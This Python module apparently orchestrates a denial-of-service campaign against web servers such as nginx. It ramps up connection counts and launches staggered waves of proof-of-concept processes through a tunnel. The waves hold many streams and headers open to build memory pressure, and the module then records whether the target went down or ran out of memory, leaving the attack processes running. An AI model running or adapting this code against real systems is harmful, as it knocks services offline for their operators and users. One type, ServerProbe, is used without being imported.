"""Ramp and cumulative-wave campaign strategies."""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time
import uuid

from attack_config import profile_max_impact
from attack_runner import run_attack
from models import RunResult
from paths import DEFAULT_PORT, LOG_DIR
from persistence import persist_run, utc_now
from probe import probe_server
from tunnel_runner import popen as tunnel_popen
from variants import get_variant, poc_script_path, set_poc_path

def run_ramp(host: str, steps: list[int], **kwargs) -> RunResult | None:
    last: RunResult | None = None
    for n in steps:
        print(f"\n>>> RAMP {n} connections <<<", flush=True)
        last = run_attack(
            strategy=f"ramp_seq_{n}",
            host=host,
            port=DEFAULT_PORT,
            connections=n,
            bomb_mode="sequential",
            notes=f"ramp step {n}",
            **kwargs,
        )
        if last.server_down or last.connections_bomb_ok < n // 2:
            print(f"Stopping ramp at {n}: down={last.server_down} bomb_ok={last.connections_bomb_ok}", flush=True)
            time.sleep(30)
            if probe_server(host).ok:
                continue
            return last
        time.sleep(15)
    return last


def run_cumulative_waves(
    host: str,
    total: int,
    wave_size: int = 5,
    stagger: int = 3,
    hold: int = 300,
    variant: str = "nginx",
    port: int = DEFAULT_PORT,
) -> None:
    """Launch wave processes that stay holding — cumulative memory pressure."""
    set_poc_path(variant)
    py = sys.executable
    script = poc_script_path(variant)
    cfg = profile_max_impact()
    waves = (total + wave_size - 1) // wave_size
    procs: list[subprocess.Popen] = []
    probe_before = probe_server(host)

    run_meta = {
        "run_id": str(uuid.uuid4())[:8],
        "timestamp": utc_now(),
        "strategy": f"cumulative_waves_{total}",
        "waves": waves,
        "wave_size": wave_size,
    }
    print(json.dumps(run_meta), flush=True)

    for w in range(waves):
        log_path = LOG_DIR / f"wave_{run_meta['run_id']}_{w+1}.log"
        env = os.environ.copy()
        env["PYTHONUNBUFFERED"] = "1"
        p = tunnel_popen(
            [py, str(script), "--host", host, "--port", str(port),
             "-n", str(wave_size), "--streams", str(cfg.streams), "--headers", str(cfg.headers),
             "--hold", str(hold), "--drip-interval", "30", "-v"],
            stdout=log_path.open("w"),
            stderr=subprocess.STDOUT,
            env=env,
        )
        procs.append(p)
        print(f"  wave {w+1}/{waves} pid={p.pid}", flush=True)
        time.sleep(stagger)

    samples: list[ServerProbe] = []
    deadline = time.monotonic() + min(hold, 120)
    while time.monotonic() < deadline:
        samples.append(probe_server(host))
        time.sleep(10)

    probe_after = probe_server(host, timeout=20)
    wire_mb = 0.0
    bomb_ok = 0
    for i, p in enumerate(procs):
        lp = LOG_DIR / f"wave_{run_meta['run_id']}_{i+1}.log"
        if lp.exists():
            txt = lp.read_text(errors="replace")
            if "Total wire uploaded:" in txt:
                for line in txt.splitlines():
                    if "Total wire uploaded:" in line:
                        try:
                            wire_mb += float(line.split("MB")[0].split()[-1])
                        except ValueError:
                            pass
            if "Phase 1 complete:" in txt and "SEND FAILED" not in txt.split("Phase 1 complete:")[0][-200:]:
                bomb_ok += wave_size

    result = RunResult(
        run_id=run_meta["run_id"],
        timestamp=utc_now(),
        strategy=f"cumulative_waves_{total}",
        target=f"{host}:{port}",
        connections_requested=total,
        connections_established=len(procs) * wave_size,
        connections_bomb_ok=bomb_ok,
        connections_active_end=-1,
        wire_mb=wire_mb,
        hold_sec=hold,
        bind_ips=["default"],
        probe_before=probe_before,
        probe_during=samples[-1] if samples else None,
        probe_after=probe_after,
        probe_worst_latency=max((s.latency_sec for s in samples if s.latency_sec), default=None),
        server_down=any(not s.ok for s in samples),
        oom_likely=not probe_after.ok,
        duration_sec=0,
        notes=f"{waves} waves stagger={stagger}s hold={hold}s (procs still running)",
        extra={
            "variant": variant,
            "kind": get_variant(variant).kind,
            "pids": [p.pid for p in procs],
            "wave_logs": str(LOG_DIR),
        },
    )
    persist_run(result)

    print(f"Cumulative waves launched — {len(procs)} processes still holding. NOT waiting full hold.", flush=True)
